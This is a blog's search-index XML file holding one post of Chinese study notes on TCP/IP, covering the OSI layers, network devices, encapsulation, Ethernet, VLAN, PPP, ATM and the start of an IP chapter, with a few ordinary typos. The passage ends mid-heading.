<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>TCP/IP</title>
    <link href="/2023/08/06/TCP-IP/"/>
    <url>/2023/08/06/TCP-IP/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-网络基础知识"><a href="#第一章-网络基础知识" class="headerlink" title="第一章 网络基础知识"></a>第一章 网络基础知识</h1><p>本章总结了深入理解TCP&#x2F;IP所必备的基础知识，其中包括计算机与网络发展的历史及其标准化过程、OSI参考模型、网络概念的本质、网络构建的设备等。</p><img src="/2023/08/06/TCP-IP/image-20230807235712949.png" class title="image-20230807235712949"><h2 id="1-5-4-OSI参考模型中各个分层的作用"><a href="#1-5-4-OSI参考模型中各个分层的作用" class="headerlink" title="1.5.4 OSI参考模型中各个分层的作用"></a>1.5.4 OSI参考模型中各个分层的作用</h2><img src="/2023/08/06/TCP-IP/image-20230807235618567.png" class title="image-20230807235618567"><h4 id="1-应用层"><a href="#1-应用层" class="headerlink" title="1.应用层"></a>1.应用层</h4><p>为应用程序提供服务并规定应用程序中通信相关的细节。包括文件传输、电子邮件、远程登录（虚拟终端）等协议。</p><h4 id="2-表示层"><a href="#2-表示层" class="headerlink" title="2.表示层"></a>2.表示层</h4><p>将应用处理的信息转换为适合网络传输的格式，或将来自下一层的数据转换为上一层能够处理的格式。因此它主要复制数据格式的转换。<br>具体来说，就是将设备固有的数据格式转换为网络标准传输格式。不同设备对同一比特流解释的结果可能会不同。因此，使它们保持一致是这一层的主要作用。</p><h4 id="3-会话层"><a href="#3-会话层" class="headerlink" title="3.会话层"></a>3.会话层</h4><p>复制建立和断开通信连接（数据流动的逻辑通路），以及数据的分割等数据传输相关的管理。</p><h4 id="4-传输层"><a href="#4-传输层" class="headerlink" title="4.传输层"></a>4.传输层</h4><p>起着可靠传输的作用。只在通信双方节点上进行处理，而无需在路由器上处理。</p><h4 id="5-网络层"><a href="#5-网络层" class="headerlink" title="5.网络层"></a>5.网络层</h4><p>将数据传输到目标地址。目标地址可以是多个网络网络通过路由器连接而成的某一个地址。因此这一层主要负责寻址和路由选择。</p><h4 id="6-数据链路层"><a href="#6-数据链路层" class="headerlink" title="6.数据链路层"></a>6.数据链路层</h4><p>负责物理层面上互连的、节点之间的通信传输。例如与1个以太网相连的2个节点之间的通信。<br>将0、1序列划分为具有意义的数据帧传送给对端（数据帧的生成与接受）。</p><h4 id="7-物理层"><a href="#7-物理层" class="headerlink" title="7.物理层"></a>7.物理层</h4><p>负责0、1比特流（0、1序列）与电压的高低、光的亮灭之间的互换。</p><h2 id="1-7-3-根据接收端类型分类"><a href="#1-7-3-根据接收端类型分类" class="headerlink" title="1.7.3 根据接收端类型分类"></a>1.7.3 根据接收端类型分类</h2><h4 id="1-单播（Unicast）"><a href="#1-单播（Unicast）" class="headerlink" title="1.单播（Unicast）"></a>1.单播（Unicast）</h4><p>1对1通信。早先的固定电话就是单播通信的一个典型例子。</p><h4 id="2-广播（Broadcast）"><a href="#2-广播（Broadcast）" class="headerlink" title="2.广播（Broadcast）"></a>2.广播（Broadcast）</h4><p>指将消息从1台主机发送给与之相连的所有其他主机。广播通信的一个典型例子就是电视播放，它将电视信号一齐发送给非特定的多个接受对象。<br>进行广播通信的计算机有一个广播范围，只有在这个范围之内的计算机才能接受到对应的广播消息。这个范围叫做广播域。</p><h4 id="3-多播（Multicast）"><a href="#3-多播（Multicast）" class="headerlink" title="3.多播（Multicast）"></a>3.多播（Multicast）</h4><p>多播与广播类似，也是将消息发送给多个接受主机。不同之处在于多播要限定某一组主机作为接受端。最典型的例子就是电视会议。</p><h4 id="4-任播（Anycast）"><a href="#4-任播（Anycast）" class="headerlink" title="4.任播（Anycast）"></a>4.任播（Anycast）</h4><p>任播是指在特定的多台主机中选出一台作为接收端的一种通信方式。任播通信从目标主机群中选择一台最符合网络条件的主机作为目标主机发送消息。通常，所选中的那台特定主机将返回一个单播信号，随后发送端主机会只跟这台主机进行通信。在实际网络的应用有DNS根域名解析服务器。</p><img src="/2023/08/06/TCP-IP/image-20230807235852276.png" class title="image-20230807235852276"><h2 id="1-9-网络的构成要素"><a href="#1-9-网络的构成要素" class="headerlink" title="1.9 网络的构成要素"></a>1.9 网络的构成要素</h2><h4 id="1-网卡"><a href="#1-网卡" class="headerlink" title="1.网卡"></a>1.网卡</h4><p>中继器（物理层）<br>物理层面上延迟网络的设备。由电缆传过来的电信号或光信号经由中继器的波形调整和放大再传给另一个电缆。中继器的两端连接的是相同的通信媒介，但有的中继器也可以完成不同媒介之间的转接工作。</p><h4 id="2-网桥-x2F-2层交换机（数据链路层）"><a href="#2-网桥-x2F-2层交换机（数据链路层）" class="headerlink" title="2.网桥&#x2F;2层交换机（数据链路层）"></a>2.网桥&#x2F;2层交换机（数据链路层）</h4><p>数据链路层面上连接两个网络的设备。它能够识别数据链路层中的数据帧，并将这些数据帧临时存储于内存，再生成信号作为一个全新的帧转发给相连的另一个网段。<br>数据位FCS用以校验数据是否正确送达目的地。</p><h4 id="3-路由器-x2F-3层交换机"><a href="#3-路由器-x2F-3层交换机" class="headerlink" title="3.路由器&#x2F;3层交换机"></a>3.路由器&#x2F;3层交换机</h4><p>网络层面上连接两个网络、并对分组报文进行转发的设备。网桥是根据物理地址（MAC）进行处理，而路由器则是根据IP地址进行处理的。<br>作用：<br>1.路由器可以连接不同的数据链路。<br>2.路由器还有分担网络负荷的作用。</p><h4 id="4-4-7层交换机"><a href="#4-4-7层交换机" class="headerlink" title="4.4~7层交换机"></a>4.4~7层交换机</h4><p>负责处理OSI某些模型中从传输层至应用层的数据。</p><h4 id="5-网关"><a href="#5-网关" class="headerlink" title="5.网关"></a>5.网关</h4><p>负责将从传输层到应用层的数据进行转换和转发的设备。它与4~7层交换机一样是处理传输层以上的数据。但是网关不仅转发数据还负责对数据进行转换，它通常会使用一个表示层或应用层网关，在两个不能直接进行通信的协议之间进行翻译，最终实现两者的通信。</p><img src="/2023/08/06/TCP-IP/image-20230808000052023.png" class title="image-20230808000052023"><h1 id="第2章-TCP-x2F-IP基础知识"><a href="#第2章-TCP-x2F-IP基础知识" class="headerlink" title="第2章 TCP&#x2F;IP基础知识"></a>第2章 TCP&#x2F;IP基础知识</h1><p>TCP（Transmission Control Protocol）和IP（InternetProtocol）是互联网的众多通信协议中最为著名的。本章旨在介绍TCP&#x2F;IP的发展历程及其相关协议的概况。</p><h2 id="2-2-TCP-x2F-IP的标准化"><a href="#2-2-TCP-x2F-IP的标准化" class="headerlink" title="2.2 TCP&#x2F;IP的标准化"></a>2.2 TCP&#x2F;IP的标准化</h2><h3 id="2-2-1-TCP-x2F-IP的具体含义"><a href="#2-2-1-TCP-x2F-IP的具体含义" class="headerlink" title="2.2.1 TCP&#x2F;IP的具体含义"></a>2.2.1 TCP&#x2F;IP的具体含义</h3><p>它只是利用IP进行通信时所必须用到的协议群的统称。具体来讲，IP或ICMP、TCP或UDP、TELNET或FTP、以及HTTP等都属于TCP&#x2F;IP的协议。有时TCP&#x2F;IP也称网际协议族。</p><img src="/2023/08/06/TCP-IP/image-20230808000154353.png" class title="image-20230808000154353"><h2 id="2-4-TCP-x2F-IP协议分层模型"><a href="#2-4-TCP-x2F-IP协议分层模型" class="headerlink" title="2.4 TCP&#x2F;IP协议分层模型"></a>2.4 TCP&#x2F;IP协议分层模型</h2><p>2.4.1 TCP&#x2F;IP与OSI参考模型</p><img src="/2023/08/06/TCP-IP/image-20230808000238716.png" class title="image-20230808000238716"><p>区别：OSI参考模型注重“通信协议必要的功能是什么”，而TCP&#x2F;IP则更强调“在计算机上实现协议应该开发哪种程序”。</p><h4 id="1-硬件（物理层）"><a href="#1-硬件（物理层）" class="headerlink" title="1.硬件（物理层）"></a>1.硬件（物理层）</h4><p>TCP&#x2F;IP的最底层是负责数据传输的硬件。</p><h4 id="2-网络接口层（数据链路层）"><a href="#2-网络接口层（数据链路层）" class="headerlink" title="2.网络接口层（数据链路层）"></a>2.网络接口层（数据链路层）</h4><p>网络接口层利用以太网中的数据链路层进行通信，因此属于接口层。</p><h4 id="3-互联网层（网络层）"><a href="#3-互联网层（网络层）" class="headerlink" title="3.互联网层（网络层）"></a>3.互联网层（网络层）</h4><p>互联网层使用IP协议，它相当于OSI模型中的第3层网络层。IP协议基于IP地址转发分包数据。所有连接互联网的主机和路由器都必须实现IP的功能，其他连接互联网的网络设备（如网桥、中继器或集线器）就没必要一定实现IP或TCP的功能。</p><h4 id="4-IP"><a href="#4-IP" class="headerlink" title="4.IP"></a>4.IP</h4><p>IP是跨域网络传送数据包，使整个互联网都能够收到数据的协议。<br>虽然IP也是分组交换的一种协议，但是它不具有重发机制。即使分组数据包未能到达对端主机也不会重发。因此，属于非可靠性传输协议。</p><h4 id="5-ICMP"><a href="#5-ICMP" class="headerlink" title="5.ICMP"></a>5.ICMP</h4><p>IP数据包在发送途中一旦发生异常导致无法到达对端目的地址时，需要给发生端发送一个异常的通知。ICMP就是为这一功能而制定的。它有时也被用来诊断网络的健康状态。</p><h4 id="6-ARP"><a href="#6-ARP" class="headerlink" title="6.ARP"></a>6.ARP</h4><p>从分组数据包的IP地址中解析出物理地址（MAC地址）的一种协议。</p><h4 id="7-传输层"><a href="#7-传输层" class="headerlink" title="7.传输层"></a>7.传输层</h4><p>传输层最主要的功能就是能够让应用程序之间实现通信。</p><h4 id="8-TCP"><a href="#8-TCP" class="headerlink" title="8.TCP"></a>8.TCP</h4><p>TCP是一种面向有连接的传输层协议。它可以保证两端通信主机之间的通信可达。TCP能够正确处理在传输过程中丢包、传输顺序乱掉等异常情况，。此外，TCP还能够有效利用带宽，缓解网络拥堵。</p><h4 id="9-UDP"><a href="#9-UDP" class="headerlink" title="9.UDP"></a>9.UDP</h4><p>UDP是一种面向无连接的传输层协议。UDP不会关注对端是否真的收到了传送过去的数据。<br>UDP常用于分组数据较少或多播、广播通信以及视频通信等多媒体领域。</p><h4 id="10-应用层（会话层以上的分层）"><a href="#10-应用层（会话层以上的分层）" class="headerlink" title="10.应用层（会话层以上的分层）"></a>10.应用层（会话层以上的分层）</h4><p>浏览器与服务端之间通信所用的协议是HTTP。所传输数据的主要格式是HTML。WWW中的HTTP属于OSI应用层的协议，而HTML属于表示层的协议。</p><h4 id="11-电子邮件（E-Mail）"><a href="#11-电子邮件（E-Mail）" class="headerlink" title="11.电子邮件（E-Mail）"></a>11.电子邮件（E-Mail）</h4><p>发送电子邮件时用到的协议叫做SMTP（Simple Mail Tranfer Protocol）。</p><h4 id="12-文件传输（FTP）"><a href="#12-文件传输（FTP）" class="headerlink" title="12.文件传输（FTP）"></a>12.文件传输（FTP）</h4><p>在FTP中进行文件传输时会建立两个TCP连接，分别是发出传输请求时所要用到的控制连接与实际传输数据时所要用到的数据连接。</p><h4 id="13-远程登录（TELNET-与-SSH）"><a href="#13-远程登录（TELNET-与-SSH）" class="headerlink" title="13.远程登录（TELNET 与 SSH）"></a>13.远程登录（TELNET 与 SSH）</h4><h4 id="14-网络管理（SNMP）"><a href="#14-网络管理（SNMP）" class="headerlink" title="14.网络管理（SNMP）"></a>14.网络管理（SNMP）</h4><p>在TCP&#x2F;IP中进行网络管理时，采用SNMP协议。使用SNMP管理的主机、网桥、路由器等称作SNMP代理（Agent），而进行管理的那一段叫做管理器。</p><h2 id="2-5-TCP-x2F-IP分层模型与通信示例"><a href="#2-5-TCP-x2F-IP分层模型与通信示例" class="headerlink" title="2.5 TCP&#x2F;IP分层模型与通信示例"></a>2.5 TCP&#x2F;IP分层模型与通信示例</h2><h3 id="2-5-2-发送数据包"><a href="#2-5-2-发送数据包" class="headerlink" title="2.5.2 发送数据包"></a>2.5.2 发送数据包</h3><h5 id="1-应用程序处理（应用层）—–编码处理与建立TCP连接。"><a href="#1-应用程序处理（应用层）—–编码处理与建立TCP连接。" class="headerlink" title="1.应用程序处理（应用层）—–编码处理与建立TCP连接。"></a>1.应用程序处理（应用层）—–编码处理与建立TCP连接。</h5><h5 id="2-TCP模块的处理（传输层）—–-TCP根据应用的指示，复制建立连接、发送数据以及断开连接。"><a href="#2-TCP模块的处理（传输层）—–-TCP根据应用的指示，复制建立连接、发送数据以及断开连接。" class="headerlink" title="2.TCP模块的处理（传输层）—– TCP根据应用的指示，复制建立连接、发送数据以及断开连接。"></a>2.TCP模块的处理（传输层）—– TCP根据应用的指示，复制建立连接、发送数据以及断开连接。</h5><h5 id="3-IP模块的处理（互联网层）-—–-IP将TCP传过来的TCP首部和TCP数据合起来当做自己的数据，并在TCP首部的前端在加上自己的IP首部。因此，IP数据包中IP首部后面紧跟着TCP首部，然后才是应用的数据首部和数据本身。IP首部中包含接收端IP地址以及发送端IP地址。紧随IP首部的还有用来判断其后面数据时TCP还是UDP的信息。"><a href="#3-IP模块的处理（互联网层）-—–-IP将TCP传过来的TCP首部和TCP数据合起来当做自己的数据，并在TCP首部的前端在加上自己的IP首部。因此，IP数据包中IP首部后面紧跟着TCP首部，然后才是应用的数据首部和数据本身。IP首部中包含接收端IP地址以及发送端IP地址。紧随IP首部的还有用来判断其后面数据时TCP还是UDP的信息。" class="headerlink" title="3.IP模块的处理（互联网层） —– IP将TCP传过来的TCP首部和TCP数据合起来当做自己的数据，并在TCP首部的前端在加上自己的IP首部。因此，IP数据包中IP首部后面紧跟着TCP首部，然后才是应用的数据首部和数据本身。IP首部中包含接收端IP地址以及发送端IP地址。紧随IP首部的还有用来判断其后面数据时TCP还是UDP的信息。"></a>3.IP模块的处理（互联网层） —– IP将TCP传过来的TCP首部和TCP数据合起来当做自己的数据，并在TCP首部的前端在加上自己的IP首部。因此，IP数据包中IP首部后面紧跟着TCP首部，然后才是应用的数据首部和数据本身。IP首部中包含接收端IP地址以及发送端IP地址。紧随IP首部的还有用来判断其后面数据时TCP还是UDP的信息。</h5><h5 id="4-网络接口（以太网驱动）的处理"><a href="#4-网络接口（以太网驱动）的处理" class="headerlink" title="4.网络接口（以太网驱动）的处理"></a>4.网络接口（以太网驱动）的处理</h5><img src="/2023/08/06/TCP-IP/image-20230808000516173.png" class title="image-20230808000516173"><h3 id="2-5-3-经过数据链路层的包"><a href="#2-5-3-经过数据链路层的包" class="headerlink" title="2.5.3 经过数据链路层的包"></a>2.5.3 经过数据链路层的包</h3><p>包流动时，从前往后依次被附加了以太网包首部、IP包首部、TCP包首部（或UDP包首部）以及应用自己的包首部和数据。而包的最后则追加上了以太网包尾。</p><p>①每个包首部中至少都会包含两个信息：一个是发送端和接受端的地址，另一个是上一层的协议类型。</p><p>经过每个协议分层时，都必须有识别包发送端和接受端的信息。以太网会用MAC地址、IP会用IP地址，而TCP&#x2F;UDP则会用端口号作为识别两端主机的地址。</p><img src="/2023/08/06/TCP-IP/image-20230808000556301.png" class title="image-20230808000556301"><p>②每个分层的包首部中还包含一个识别位，它是用来标识上一层协议的种类信息。例如以太网的包首部中的以太网类型，IP中的协议类型以及TCP&#x2F;UDP中两个端口的端口号等都起着识别协议类型的作用。</p><h3 id="2-5-4-数据包接收处理"><a href="#2-5-4-数据包接收处理" class="headerlink" title="2.5.4 数据包接收处理"></a>2.5.4 数据包接收处理</h3><h4 id="1-网络接口（以太网驱动）的处理"><a href="#1-网络接口（以太网驱动）的处理" class="headerlink" title="1.网络接口（以太网驱动）的处理"></a>1.网络接口（以太网驱动）的处理</h4><p>主机收到以太网包后，首先从以太网的包首部找到MAC地址判断是否为发给自己的包。如果不是发给自己的包则丢弃。而如果是发给自己的包，就查找以太网包首部中的类型域从而确定以太网协议所传送过来的数据类型。如果这时不是IP而是其他诸如ARP的协议，就把数据传给ARP处理。总之，如果以太网包首部的类型域包含了一个无法识别的协议类型，则丢弃数据。</p><h4 id="2-IP模块的处理"><a href="#2-IP模块的处理" class="headerlink" title="2.IP模块的处理"></a>2.IP模块的处理</h4><p>IP模块收到IP包首部及后面的数据部分以后，也做类似的处理。如果判断得出包首部中的IP地址与自己的IP地址匹配，则可以接收数据并从中查找上一层的协议。即如果上一层是TCP则交给TCP处理，如果是UDP则交给UDP处理。对于有路由器的情况下，接收端地址往往不是自己的地址，此时，需要借助路由控制表，在调查应该送达的主机或路由器以后再转发数据。</p><h4 id="3-TCP模块的处理"><a href="#3-TCP模块的处理" class="headerlink" title="3.TCP模块的处理"></a>3.TCP模块的处理</h4><p>在TCP模块中，首先会计算一下校验和，判断数据是否被破坏。然后检查是否在按照序号接受数据。最后检查端口号，确定具体的应用程序。数据接收完毕后，接收端会发生一个“确认回执”给发送端。如果这个回执未能到达发送端，则发送端会认为接收端没有接收到数据而一直反复发送。</p><h4 id="4-应用程序的处理"><a href="#4-应用程序的处理" class="headerlink" title="4.应用程序的处理"></a>4.应用程序的处理</h4><p>接收端应用程序接收数据。通过解析获取目的地址，如果没有该地址，会给发送端返回一个报错信息表明找不到目标。如果发送正常完成，就会给发送端发送一个“处理正常”的回执，反之发送“处理异常”。</p><h1 id="第3章-数据链路"><a href="#第3章-数据链路" class="headerlink" title="第3章 数据链路"></a>第3章 数据链路</h1><p>本章主要介绍计算机网络最基本的内容——数据链路层。如果没有数据链路层，基于TCP&#x2F;IP的通信也就无从谈起。因此，本章将着重介绍TCP&#x2F;IP的具体数据链路，如以太网、无线局域网、PPP等。</p><h2 id="3-2-数据链路相关技术"><a href="#3-2-数据链路相关技术" class="headerlink" title="3.2 数据链路相关技术"></a>3.2 数据链路相关技术</h2><h3 id="3-2-1-MAC地址"><a href="#3-2-1-MAC地址" class="headerlink" title="3.2.1 MAC地址"></a>3.2.1 MAC地址</h3><p>MAC地址用于识别数据链路中互连的节点（如图3.4）。以太网或FDDI中，根据IEEE02.3的规范使用MAC地址。其他诸如无线LAN、蓝牙等设备中也是用相同规格的MAC地址。</p><img src="/2023/08/06/TCP-IP/image-20230808000732196.png" class title="image-20230808000732196"><p>MAC地址长48比特，如下图。<strong>任何一个网卡</strong>的MAC地址都是唯一的。但存在例外情况，实际上即使MAC地址相同，只要不是同属一个数据链路就不会出现问题。</p><img src="/2023/08/06/TCP-IP/image-20230808000802091.png" class title="image-20230808000802091"><h3 id="3-2-2-共享介质型网络"><a href="#3-2-2-共享介质型网络" class="headerlink" title="3.2.2 共享介质型网络"></a>3.2.2 共享介质型网络</h3><p>从通信介质的使用方法上看，网络可分为共享介质型和非共享介质型。</p><p>共享介质型网络指多个设备共享一个通信介质的一种网络，如最早的以太网和FDDI，在这种方式下，设备之间使用同一个载波信道进行发送和接收。为此，基本上采用半双工通信方式，并有必要对介质进行访问控制。</p><p>共享介质型网络有两种介质访问控制方式：</p><h4 id="1-争用方式"><a href="#1-争用方式" class="headerlink" title="1.争用方式"></a>1.争用方式</h4><p>争用方式是指多去数据传输的权利，也叫CSMA（载波监听多路访问）。这种方式通常令网络中的各个站采用先到先得的方式占用信道发送数据，如果多个站同时发送帧，则会发送冲突现象，因此导致网络拥堵与性能下降。</p><img src="/2023/08/06/TCP-IP/image-20230808000849069.png" class title="image-20230808000849069"><p>减弱冲突现象：<br>采用改良CSMA的另一种方式——CSMA&#x2F;CD（载波监听多路访问&#x2F;冲突检测）方式。CSMA&#x2F;CD要求每个站提前检查冲突，一旦发生冲突，则尽早释放信道。</p><p>CSMA&#x2F;CD工作原理（如图3.7）：<br>①如果载波信道上没有数据流动，则任何站都可以发送数据。<br>②检查是否会发生冲突。一旦发生冲突，放弃发送数据，同时立即释放载波信道。<br>③放弃发送以后，随机延时一段时间，再重新争用介质，重新发送帧。</p><img src="/2023/08/06/TCP-IP/image-20230808001008103.png" class title="image-20230808001008103"><h4 id="2-令牌传递方式"><a href="#2-令牌传递方式" class="headerlink" title="2.令牌传递方式"></a>2.令牌传递方式</h4><p>令牌传递方式是沿着令牌环发送一种叫做“令牌”的特殊报文，是控制传输的一种方式。只有获取令牌的站才能发送数据。 但在网络不太拥堵的情况下数据链路的利用率也达不到100%。<br>这种方式有两个特点：<br>①不会有冲突<br>②每个站都有通过平等循环获得令牌的机会。因此，既是网络拥堵也不会导致性能下降。</p><img src="/2023/08/06/TCP-IP/image-20230808001036683.png" class title="image-20230808001036683"><h2 id="3-2-3-非共享介质型网络"><a href="#3-2-3-非共享介质型网络" class="headerlink" title="3.2.3 非共享介质型网络"></a>3.2.3 非共享介质型网络</h2><p>网络中的每个站直连交换机，由交换机转发帧。此方式下，发送端和接收端并不共享通信介质，因此很多情况下采用全双工通信方式。在一对一连接全双工的方式下不会发生冲突，因此不需要CSNA&#x2F;CD就可以实现更高效的通信。</p><p>该方式还可以根据交换机的高效特性构建虚拟局域网（VLAN）、进行流量控制等。缺点是一旦换机发生故障，与之相连的计算机之间都无法通信。</p><img src="/2023/08/06/TCP-IP/image-20230808001100267.png" class title="image-20230808001100267"><h3 id="3-2-4-根据MAC地址转发"><a href="#3-2-4-根据MAC地址转发" class="headerlink" title="3.2.4 根据MAC地址转发"></a>3.2.4 根据MAC地址转发</h3><p>以太网交换机就是持有多个端口的网桥。它们根据数据链路层中每个帧的目的MAC地址，决定从哪个网络接口发送数据。这时所参考的、用以记录发送接口的表叫做转发表。转发表的内容是自动生成的，这一过程叫自学过程。</p><img src="/2023/08/06/TCP-IP/image-20230808001119864.png" class title="image-20230808001119864"><h3 id="3-2-5-环路检测技术"><a href="#3-2-5-环路检测技术" class="headerlink" title="3.2.5 环路检测技术"></a>3.2.5 环路检测技术</h3><p>解决网络中的环路问题有生成树和源路由两种方式。</p><h4 id="1-生成树方式"><a href="#1-生成树方式" class="headerlink" title="1.生成树方式"></a>1.生成树方式</h4><p>每个网桥必须在每1~10秒内相互交换BPDU包，从而判断哪些端口使用哪些不使用，以便消除环路。一旦发生故障，则自动切换通信线路，利用那些没有被使用的端口继续进行传输。</p><h4 id="2-源路由法"><a href="#2-源路由法" class="headerlink" title="2.源路由法"></a>2.源路由法</h4><p>该方法可以判断发送数据的源地址是哪个网桥实现传输的，并将帧写入RIF。网桥根据这个RIF信息发送帧给目标地址。因此网桥中即使出现环路，数据帧也不会被反复转发。</p><h3 id="3-2-6-VLAN"><a href="#3-2-6-VLAN" class="headerlink" title="3.2.6 VLAN"></a>3.2.6 VLAN</h3><p>相比一般的网桥&#x2F;2层交换机，VLAN可以过滤多余的包，提高网络的承载效率。</p><p>如图3.15所示，该交换机按照其端口区分了多个网段，从而区分了广播数据传播的范围，减少了网络负载并提高了网络的安全性。</p><img src="/2023/08/06/TCP-IP/image-20230808001211886.png" class title="image-20230808001211886"><p>TAG VLAN中对每个网段都用一个VLAN ID 的标签进行唯一表示。在交换机传输帧时，在以太网首部加入这个VID标签，根据这个值决定将数据帧发送给哪个网段（如图3.16）。</p><img src="/2023/08/06/TCP-IP/image-20230808001228803.png" class title="image-20230808001228803"><h2 id="3-3-以太网"><a href="#3-3-以太网" class="headerlink" title="3.3 以太网"></a>3.3 以太网</h2><h3 id="3-3-2-以太网的分类"><a href="#3-3-2-以太网的分类" class="headerlink" title="3.3.2 以太网的分类"></a>3.3.2 以太网的分类</h3><p>以太网中以时钟频率决定传输速度。<br>1K&#x3D;1000<br>1M&#x3D;1000K<br>1G&#x3D;1000M</p><h3 id="3-3-4-以太网帧格式"><a href="#3-3-4-以太网帧格式" class="headerlink" title="3.3.4 以太网帧格式"></a>3.3.4 以太网帧格式</h3><p>以太网帧前端有一个前导码，它由0、1数字交替组成，表示一个以太网帧的开始，也是对端网卡能够确保与其同步的标志。如图3.19所示。前导码末尾是一个叫做SFD的域，它的值时“11”。在这个域之后就是以太网帧的本体。前导码与SFD合起来占8个字节。</p><img src="/2023/08/06/TCP-IP/image-20230808001432188.png" class title="image-20230808001432188"><p>以太网帧本体的前端是以太网的首部，它总共占14个字节。分别是6个字节的目标MAC地址、6个字节的源MAC地址以及2个字节的上层协议类型。</p><img src="/2023/08/06/TCP-IP/image-20230808001455680.png" class title="image-20230808001455680"><p>紧随帧头后面的是数据。一个数据帧所能容纳的最大数据范围是46~1500个字节。帧尾是一个叫做FCS（帧检验序列）的4个字节。它可以检查帧是否有所损坏，通过检查这个FCS字段的值可以将那些受到噪声干扰的错误帧丢弃。FCS中保存着整个帧除以生成多项式的余数。在接收端也用同样的方法计算，如果得到的FCS值相同，就说明帧没有差错。</p><p>VLAN中以太网帧的格式</p><img src="/2023/08/06/TCP-IP/image-20230808001526057.png" class title="image-20230808001526057"><h2 id="3-5-PPP"><a href="#3-5-PPP" class="headerlink" title="3.5 PPP"></a>3.5 PPP</h2><h3 id="3-5-1-PPP定义"><a href="#3-5-1-PPP定义" class="headerlink" title="3.5.1 PPP定义"></a>3.5.1 PPP定义</h3><p>PPP是指点对点，即1对1连接计算机的协议。PPP相当于位于OSI参考模型第2层的数据链路层。PPP可以使用电话线或ISDN、专线、ATM线路。</p><h3 id="3-5-2-LCP与NCP"><a href="#3-5-2-LCP与NCP" class="headerlink" title="3.5.2 LCP与NCP"></a>3.5.2 LCP与NCP</h3><p>在PPP的主要功能中包含两个协议：一个是不依赖上层的LCP(Link Control Protocol)协议，另一个是依赖上层的NCP(Network Control Protocol)协议，如果上层为IP，也叫做IPCP(IP Control Protocol)。</p><p>LCP主要负责建立和断开连接、设置最大接受单元、设置验证协议（PAP或CHAP）以及设置是否进行通信质量的监控。</p><p>IPCP负责IP地址设置以及是否进行TCP&#x2F;IP首部压缩等设备。</p><h3 id="3-5-3-PPP的帧格式"><a href="#3-5-3-PPP的帧格式" class="headerlink" title="3.5.3 PPP的帧格式"></a>3.5.3 PPP的帧格式</h3><p>PPP的数据帧如图3.26所示。其中标志码用来区分每一个帧。在两个标志码中间不允许出现连续6个以上的“1”，因此在发送帧的时候，当连续出现5个“1”时后面必须插入一个0，接受端则当收到连续5个“1”且后面是0，则必须删除后面的0。</p><img src="/2023/08/06/TCP-IP/image-20230808001554371.png" class title="image-20230808001554371"><h3 id="3-5-4-PPPoE"><a href="#3-5-4-PPPoE" class="headerlink" title="3.5.4 PPPoE"></a>3.5.4 PPPoE</h3><p>有些互联网接入服务商在以太网上利用PPPoE提供PPP功能。</p><img src="/2023/08/06/TCP-IP/image-20230808001613791.png" class title="image-20230808001613791"><h3 id="3-6-其他数据链路"><a href="#3-6-其他数据链路" class="headerlink" title="3.6 其他数据链路"></a>3.6 其他数据链路</h3><h4 id="3-6-1-ATM"><a href="#3-6-1-ATM" class="headerlink" title="3.6.1 ATM"></a>3.6.1 ATM</h4><p>ATM(Asunchronous Transfer Mode)是以一个叫做信元（5字节首部加488字节数据）的单位进行传输的数据链路，由于其线路占用时间短和能够高效传输大容量数据等特点主要用于广域网络的连接。</p><h5 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h5><p>1.是一种面向连接的数据链路。允许同时与多个对端建立通信连接。<br>2.允许任何时候发送任何数据。因此，当大量计算机同时发送大量数据时容易引发网络拥堵甚至使网络进入收敛状态。</p><p><strong>收敛状态：</strong>指当网络非常拥堵时，路由器或交换机无法完成包的处理，从而丢弃这些包的一种状态。</p><h5 id="ATM与上层协议："><a href="#ATM与上层协议：" class="headerlink" title="ATM与上层协议："></a>ATM与上层协议：</h5><p>ATM的一个信元只能发送固定的48字节数据。这48个字节的数据部分若包含IP首部和TCP首部，则基本无法存放上层的数据。为此，一般不会单独使用ATM，而是使用上层的AAL。在上层为IP的情况下叫做AAL5。如图3.30所示，每个IP包被附加各层的协议首部以后，最多可以被分为192个信元发送出去。</p><img src="/2023/08/06/TCP-IP/image-20230808001718144.png" class title="image-20230808001718144"><p><strong>弊端</strong>：在ATM网中即使只是一个信元丢失，也要重新发送最多192个信元。<br>所以在构建ATM网络的时候。必须保证终端的带宽合计小于主干网的带宽，还要尽量保证信元不易丢失。</p><h2 id="3-7-专用网络"><a href="#3-7-专用网络" class="headerlink" title="3.7 专用网络"></a>3.7 专用网络</h2><h3 id="3-7-7-VPN"><a href="#3-7-7-VPN" class="headerlink" title="3.7.7 VPN"></a>3.7.7 VPN</h3><p>虚拟专用网络（VPN）用于连接距离较远的地域。这种服务包括IP-VPN和广域以太网。</p><h4 id="IP-VIN"><a href="#IP-VIN" class="headerlink" title="IP-VIN"></a>IP-VIN</h4><p>指在IP网络（互联网）上建立VPN。</p><p>网络服务商提供一种在IP网络上使用MPLS技术构建VPN的服务。其中MPLS在IP包中附加一个叫做标签的信息进行传输控制。每个用户的标签信息不同，因此在通过MPLS网时，可以轻松地判断出目标地址。</p><h4 id="广域以太网"><a href="#广域以太网" class="headerlink" title="广域以太网"></a>广域以太网</h4><p>服务提供商所提供的用于连接相距较远的地域一种服务。IP-VPN是在IP层面的连接，广域以太网则是在作为数据链路层的以太网上利用VLAN实现VPN的技术。</p><h1 id="第4章-IP协议"><a href="#第4章-IP协议" class="headerlink" title="第4章 IP协议"></a>第4章 IP协议</h1><h2 id="4-1-IP即网际协议"><a href="#4-1-IP即网际协议" class="headerlink" title="4.1 IP即网际协议"></a>4.1 IP即网际协议</h2><h3 id="4-1-1-IP相当于OSI参考模型的第3层"><a href="#4-1-1-IP相当于OSI参考模型的第3层" class="headerlink" title="4.1.1 IP相当于OSI参考模型的第3层"></a>4.1.1 IP相当于OSI参考模型的第3层</h3><p>IP（IPv4、IPv6）相当于OSI参考模型中的第3层——网络层。</p><p>网络层的主要作用是实现终端节点之间的通信。这种终端节点之间的通信也叫做“点对点（ebd-to-end）通信”。</p><p>网络层可以跨越不同的数据链路层，即使是在不同的数据链路上也能实现两端节点之间的数据包传输。</p><p>主机与节点<br>准确的说，主机的定义是指“配置有IP地址，但是不进行路由控制的设备”。既配有IP地址又具有路由控制能力的设备叫做路由器。</p><h3 id="4-1-2-网络层与数据链路层的关系"><a href="#4-1-2-网络层与数据链路层的关系" class="headerlink" title="4.1.2 网络层与数据链路层的关系"></a>4.1.2 